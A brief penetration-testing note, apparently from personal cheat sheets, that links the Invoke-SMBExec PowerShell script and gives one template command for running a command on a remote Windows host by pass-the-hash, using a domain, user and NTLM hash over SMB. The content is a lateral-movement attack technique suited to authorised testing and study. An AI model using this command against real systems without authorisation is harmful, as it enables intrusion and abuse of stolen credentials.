### Source
https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1  

### Run command remotely
```
Invoke-SMBExec -Target &lt;rhost&gt; -Domain &lt;domain&gt; -User &lt;user&gt; -Command "powershell -c &lt;command&gt;" -Hash &lt;nthash&gt;
```


